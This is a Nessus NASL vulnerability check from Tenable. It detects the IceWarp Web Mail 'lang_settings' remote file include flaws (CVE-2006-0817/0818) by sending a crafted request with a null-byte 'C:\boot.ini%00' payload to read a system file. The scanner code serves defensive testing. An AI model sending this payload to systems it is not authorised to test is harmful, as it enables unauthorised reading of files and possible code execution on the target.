#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is prone to
remote file include attacks. 

Description :

The remote host is running IceWarp Web Mail, a webmail product written
in PHP that is distributed as a standalone application and also
bundled with VisNetic Mail Server and Merak Mail Server. 

The version of IceWarp Web Mail installed on the remote host fails to
sanitize user-supplied input to the 'lang_settings' parameter of the
'accounts/inc/include.php' and 'admin/inc/include.php' scripts before
using it to include PHP code.  An unauthenticated attacker may be able
to exploit these flaws to view arbitrary files on the remote host or
to execute arbitrary PHP code, for example, after injecting it into
the mail server's log file. 

See also :

http://secunia.com/secunia_research/2006-12/advisory/
http://secunia.com/secunia_research/2006-14/advisory/

Solution :

Upgrade to IceWarp Web Mail 5.6.1 / Merak Mail Server 8.3.8.r /
VisNetic Mail Server 8.5.0.5 or later. 

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:N/I:P/A:N/B:N)";
if (description)
{
  script_id(22079);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-0817", "CVE-2006-0818");
  script_bugtraq_id(19007, 19002);

  script_name(english:"IceWarp lang_settings Remote File Include Vulnerabilities");
  script_summary(english:"Tries to read a local file using IceWarp");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 4096, 32000);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:32000);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Unless we're being paranoid, make sure the banner belongs to IceWarp.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner || "IceWarp" >!< banner) exit(0);
}


# Try to exploit the flaw to read a file.
#
# nb: while the software does run under Linux, the code in securepath()
#     doesn't allow values for lang_settings that start with a '/' or
#     contain directory traversal sequences so trying to read /etc/passwd,
#     say, is useless.
file = "C:\\boot.ini%00";
req = http_get(
  item:string(
    "/admin/inc/include.php?",
    "language=0&",
    "lang_settings[0][1]=", file
  ),
  port:port
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);


# There's a problem if looks like boot.ini.
if ("[boot loader]">< res) {
  report = string(
    desc,
    "\n\n",
    "Plugin output :\n",
    "\n",
    "Here are the contents of the file '\\boot.ini' that Nessus\n",
    "was able to read from the remote host :\n",
    "\n",
    res
  );
  security_note(port:port, data:report);
  exit(0);
}

